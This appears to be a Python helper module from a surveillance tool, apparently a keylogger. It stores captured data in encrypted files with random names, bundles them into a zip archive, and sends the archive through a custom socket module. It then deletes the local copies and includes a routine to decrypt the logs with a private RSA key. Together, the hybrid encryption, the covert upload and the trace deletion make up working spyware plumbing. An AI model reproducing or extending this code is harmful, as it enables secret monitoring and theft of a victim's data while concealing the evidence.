from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from sys import argv
import pygetwindow as gw
import utils.socket as s
import datetime, random, zipfile, glob, os

def currentTime(format=None):
    time = datetime.datetime.now()
    h = time.hour
    m = time.minute

    if format is None:
        return f"{h:02}:{m:02}"
    if format == 'int':
        return int(h),int(m)
    if format == 'date':
        tmp = time.strftime("%Y")+'.'+time.strftime("%m")+'.'+time.strftime("%d")
        return tmp
    if format == 'datetime':
        tmp = time.strftime("%Y")+'.'+time.strftime("%m")+'.'+time.strftime("%d")+' - '+f"{h:02}:{m:02}"
        return tmp
    
def futureTime(interval, format=None):
    tmpH,tmpM = currentTime('int')
    tmpM += int(interval)

    totalMin = tmpH * 60 + tmpM
    tmpH = (totalMin // 60) % 24
    tmpM = totalMin % 60
    
    if format is None:
        return f"{tmpH:02}:{tmpM:02}"
    if format == 'int':
        return [tmpH,tmpM]
    
def checkFlag(timeArr):
    tmpH, tmpM = currentTime('int')
    futureH = timeArr[0]
    futureM = timeArr[1]

    currentMins = tmpH * 60 + tmpM
    futureMins = futureH * 60 + futureM
    if futureMins < currentMins: futureMins+=24*60

    return currentMins >= futureMins

def genStr(len, format=None):
    if format is None:
        dict = 'abcdefghijklmnopqrstuvwxyz1234567890()-_,.'
        tmp = ''
        for i in range(int(len)):
            tmp += random.choice(dict)
        return 'output/' + tmp + '.cfd'
    if format == 'alpha':
        dict = 'abcdefghijklmnopqrstuvwxyz'
        tmp = ''
        for i in range(int(len)):
            tmp += random.choice(dict)
        return tmp

def save(data):
    dt = currentTime('datetime')
    title = genStr(16)
    imprinted = '!!! BEGINNING OF FILE !!!\n' + dt + '\n\n' + data + '\n\n!!! END OF FILE !!!'
    encoded,key,iv = encryptAES(imprinted.encode())
    
    encodedKey = encryptRSA(key)

    with open(title, 'wb') as f:
        f.write(iv)
        f.write(encodedKey)
        f.write(encoded)
    f.close()
    
def zipFiles():
    n = genStr(8,'alpha')
    files = glob.glob('output/*.cfd')
    with zipfile.ZipFile(n + '.zip','w') as zipf:
        for file in files:
            zipf.write(file)
    zipf.close()
    for f in files:
        os.remove(f)
    
    s.send(n + '.zip')
    os.remove(n + '.zip')

def readLog():
    with open(argv[1],'rb') as f:
        iv = f.read(16)
        key = f.read(256)
        ciphertext = f.read()
    f.close()
    decryptedKey = decryptRSA(key)
    print(decryptAES(ciphertext,decryptedKey,iv))

def encryptAES(data):
    padded = pad(data,16)
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(padded)
    return ciphertext,key,iv

def decryptAES(data,key,iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    message = cipher.decrypt(data)
    return message.decode()
    
def encryptRSA(data):
    key = RSA.import_key(open('keys/pub.pem').read())
    cipherRSA = PKCS1_OAEP.new(key)
    encrypted = cipherRSA.encrypt(data)
    return encrypted
    
def decryptRSA(data):
    key = RSA.import_key(open('keys/priv.pem').read())
    cipherRSA = PKCS1_OAEP.new(key)
    decrypted = cipherRSA.decrypt(data)
    return decrypted